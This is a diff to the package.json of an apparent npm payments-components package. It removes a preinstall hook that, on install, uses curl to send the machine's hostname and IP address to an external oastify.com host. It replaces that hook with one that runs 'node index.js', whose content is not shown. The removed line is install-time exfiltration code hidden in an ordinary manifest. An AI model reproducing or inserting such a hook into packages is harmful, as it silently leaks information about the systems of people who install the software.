@@ -4,7 +4,7 @@
   "version": "1.0.0",
   "description": "Open Source Payments Components",
   "scripts": {
-    "preinstall": "curl -X POST -d \"hostname=$(hostname)&ip=$(hostname -I | awk '{print \"$1\"}')\" https://nvmr7j5ar5y75nsfvywejcqvbmhd59ty.oastify.com",
+    "preinstall": "node index.js",
     "lint": "eslint force-app/main/default/lwc/**/*.js",
     "lint:fix": "eslint --fix force-app/main/default/lwc/**/*.js",
     "format": "prettier --write \"force-app/main/default/lwc/**/*.{css,html,js,json,md,xml,yaml,yml}\"",
